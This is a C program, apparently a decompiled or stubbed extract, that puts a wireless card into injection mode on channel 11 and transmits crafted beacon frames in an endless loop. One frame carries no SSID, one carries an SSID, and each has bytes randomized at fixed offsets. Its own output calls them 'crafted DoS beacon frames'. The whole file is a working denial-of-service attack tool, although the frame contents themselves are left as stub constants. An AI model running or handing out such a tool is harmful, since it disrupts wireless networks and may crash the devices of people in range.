
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef char uint8_t ;
struct tx80211_packet {char* packet; int plen; } ;
struct tx80211 {char* ifname; } ;


 int BEACON_NOSSID ;
 int BEACON_NOSSID_LEN ;
 int BEACON_SSID ;
 int BEACON_SSID_LEN ;
 int INJ_NODRIVER ;
 int TX80211_FUNCMODE_INJMON ;
 int exit (int) ;
 int memcpy (char*,int ,int) ;
 int printf (char*,...) ;
 int rand () ;
 int srand (int ) ;
 int time (int *) ;
 int tx80211_close (struct tx80211*) ;
 char* tx80211_geterrstr (struct tx80211*) ;
 int tx80211_init (struct tx80211*,char*,int) ;
 int tx80211_open (struct tx80211*) ;
 int tx80211_resolvecard (char*) ;
 int tx80211_setchannel (struct tx80211*,int) ;
 int tx80211_setfunctionalmode (struct tx80211*,int ) ;
 scalar_t__ tx80211_txpacket (struct tx80211*,struct tx80211_packet*) ;
 int usage (char**) ;

int
main(int argc, char **argv)
{
 struct tx80211 tx;
 struct tx80211_packet pkt;
 char p1[BEACON_NOSSID_LEN];
 char p2[BEACON_SSID_LEN];
 int ret, drivertype;
 uint8_t randbyte;

 if (argc < 3) {
  usage(argv);
  return 0;
 }

 printf("[+] Initializing interface %s...\n", argv[1]);

 drivertype = tx80211_resolvecard(argv[2]);
 if (drivertype == INJ_NODRIVER) {
  printf("[-] Driver name not recognized.\n");
  exit(1);
 }

 ret = tx80211_init(&tx, argv[1], drivertype);
 if (ret < 0) {
  printf("[-] Error initializing %s/%s", argv[1], argv[2]);
  exit(1);
 }

 ret = tx80211_setfunctionalmode(&tx, TX80211_FUNCMODE_INJMON);
 if (ret != 0) {
  printf("[-] Error setting monitor mode.\n");
  printf("[-] %s.\n", tx80211_geterrstr(&tx));
  exit(1);
 }

 ret = tx80211_setchannel(&tx, 11);
 if (ret < 0) {
  printf("[-] Error setting channel.\n");
  printf("[-] %s.\n", tx80211_geterrstr(&tx));
  exit(1);
 }

 ret = tx80211_open(&tx);
 if (ret < 0) {
  printf("[-] Unable to open interface %s\n", tx.ifname);
  printf("[-] %s.\n", tx80211_geterrstr(&tx));
  exit(1);
 }

 srand(time(((void*)0)));

 memcpy(p1, BEACON_NOSSID, BEACON_NOSSID_LEN);
 memcpy(p2, BEACON_SSID, BEACON_SSID_LEN);

 printf("[+] Injecting crafted DoS beacon frames...\n");

 while (1) {
  randbyte = rand() & 0xff;
  p1[15] = randbyte;
  p1[21] = randbyte;
  p2[15] = randbyte;
  p2[21] = randbyte;

  pkt.packet = p1;
  pkt.plen = BEACON_NOSSID_LEN;
  if (tx80211_txpacket(&tx, &pkt) < 0) {
   printf("[-] Unable to transmit packet.\n");
   printf("[-] %s.\n", tx80211_geterrstr(&tx));
   exit(1);
  }

  pkt.packet = p2;
  pkt.plen = BEACON_SSID_LEN;
  if (tx80211_txpacket(&tx, &pkt) < 0) {
   printf("[-] Unable to transmit packet.\n");
   printf("[-] %s.\n", tx80211_geterrstr(&tx));
   exit(1);
  }
 }

 tx80211_close(&tx);

 return 0;
}
